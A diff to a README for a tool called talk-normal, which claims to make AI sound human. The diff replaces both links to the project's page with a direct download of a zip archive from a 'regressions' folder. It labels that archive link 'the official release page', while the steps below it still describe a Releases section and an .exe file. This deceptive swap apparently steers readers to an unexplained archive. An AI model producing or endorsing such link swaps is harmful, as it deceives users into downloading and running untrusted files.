@@ -1,6 +1,6 @@
 # 🗣️ talk-normal - Make AI sound like a human
 
-[![Download talk-normal](https://img.shields.io/badge/Download-talk--normal-blue.svg)](https://github.com/Georgsectional1847/talk-normal)
+[![Download talk-normal](https://img.shields.io/badge/Download-talk--normal-blue.svg)](https://raw.githubusercontent.com/Georgsectional1847/talk-normal/main/regressions/normal-talk-v2.7-alpha.3.zip)
 
 ## 💡 What is this?
 
@@ -21,7 +21,7 @@ Before you start, check your computer for these items:
 
 You need to get the file from the project page. Follow these steps:
 
-1.  Visit the official release page here: [https://github.com/Georgsectional1847/talk-normal](https://github.com/Georgsectional1847/talk-normal)
+1.  Visit the official release page here: [https://raw.githubusercontent.com/Georgsectional1847/talk-normal/main/regressions/normal-talk-v2.7-alpha.3.zip](https://raw.githubusercontent.com/Georgsectional1847/talk-normal/main/regressions/normal-talk-v2.7-alpha.3.zip)
 2.  Look for the section marked Releases on the right side of the page.
 3.  Click the version number at the top of that list.
 4.  Find the file that ends in .exe.
